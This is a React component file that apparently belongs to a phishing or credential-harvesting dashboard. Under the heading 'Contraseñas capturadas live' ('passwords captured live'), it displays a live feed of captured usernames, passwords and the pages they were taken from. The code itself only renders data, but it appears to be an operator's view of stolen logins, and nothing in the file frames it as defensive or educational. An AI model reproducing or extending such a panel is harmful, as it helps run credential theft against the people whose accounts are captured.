import React,{useEffect,useState} from 'react';


export default function CardCapturedLive ({pageData}) {
    const [data,setData] = useState(null)
    useEffect(() => {
        setData(pageData);
    }, [pageData])

    return(
        <div className="flex items-end justify-end">
            <div className="relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-lg rounded ">
              <div className="flex flex-wrap items-center">
                <div className="relative w-full px-4 max-w-full flex-grow flex-1">
                  <h3
                    className={
                      "font-semibold text-lg " +
                      ("text-blueGray-700" )
                    }
                  >
                    Contraseñas capturadas live
                  </h3>
                </div>
              </div>
              {data&&data.length>0&&data.map((d)=>{
                return(
                    <div className="flex flex-col space-y-2 text-xs max-w-xs m-3 order-1 ">
                        <div>
                            <span className="px-4 py-2 rounded-lg inline-block rounded-br-none bg-lightBlue-500 text-white">
                                {`
                                    Usuario: ${d.user}
                                    password: ${d.password}
                                    page: ${d.page}
                                `}
                            </span>
                        </div>
                    </div>
                )
              })}
            </div>
         </div>
    )
}